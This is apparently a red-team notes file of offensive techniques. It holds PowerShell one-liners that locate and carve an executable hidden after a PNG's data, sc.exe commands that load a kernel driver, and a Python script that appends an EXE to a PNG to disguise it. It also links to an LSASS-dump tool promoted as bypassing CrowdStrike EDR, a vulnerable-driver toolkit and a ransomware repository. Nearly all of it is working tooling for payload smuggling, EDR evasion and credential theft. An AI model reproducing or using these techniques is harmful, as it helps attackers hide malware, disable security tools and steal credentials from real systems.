# create shellocde clone process and inject 
https://github.com/wtechsec/LSASS-Forked-Dump---Bypass-EDR-CrowdStrike/blob/main/PoC_Lsass.ps1


# powershell code, check offset for bytes 
```ps
$b=[IO.File]::ReadAllBytes("C:\Users\user\Desktop\output.png");$t=[byte[]](0x4D,0x5A,0x78,0x00,0x01,0x00,0x00,0x00);$c=0;for($i=0;$i-le$b.Length-$t.Length;$i++){$m=$true;for($j=0;$j-lt$t.Length;$j++){if($b[$i+$j]-ne$t[$j]){$m=$false;break}};if($m){$c++;Write-Host "Found at offset: $i"}}; Write-Host "Total: $c"
```
# powershell code, remove all bytes before specificied search
```ps
$b=[IO.File]::ReadAllBytes("C:\Users\user\Desktop\output.png");$t=[byte[]](0x4D,0x5A,0x78,0x00,0x01,0x00,0x00,0x00);for($i=0;$i-le$b.Length-$t.Length;$i++){$m=$true;for($j=0;$j-lt$t.Length;$j++){if($b[$i+$j]-ne$t[$j]){$m=$false;break}};if($m){[IO.File]::WriteAllBytes("C:\Users\simspace\Desktop\output.png",$b[$i..($b.Length-1)]);break}}
```
# simple load of kernel driver 
sc.exe create KernelName type= kernel binPath= "C:\Users\user\Desktop\kernel.sys"

sc.exe start KernelName

# combine png and exe
```py
import argparse

def embed_exe_in_png(png_path, exe_path, output_path):
    # Read the PNG file
    with open(png_path, 'rb') as f:
        png_data = f.read()

    # Read the EXE file
    with open(exe_path, 'rb') as f:
        exe_data = f.read()

    # Append the EXE data to the PNG data
    combined_data = png_data + exe_data

    # Write the combined data to the output file
    with open(output_path, 'wb') as f:
        f.write(combined_data)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Embed EXE file into PNG image')
    parser.add_argument('--png', help='PNG file path', required=True)
    parser.add_argument('--exe', help='EXE file path', required=True)
    parser.add_argument('--output', help='Output file path', default='output.png')

    args = parser.parse_args()

    embed_exe_in_png(args.png, args.exe, args.output)
```

# check first 8 bytes of exe 
```py
import argparse

def check_bytes(file_path):
    with open(file_path, "rb") as f:
        data = f.read(8)
        print(data.hex())

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Check first 8 bytes of an EXE file")
    parser.add_argument("--file", help="EXE file path", required=True)
    args = parser.parse_args()
    check_bytes(args.file)
```



# Kernel driver 
https://github.com/BlackSnufkin/BYOVD
https://github.com/xM0kht4r/VEN0m-Ransomware
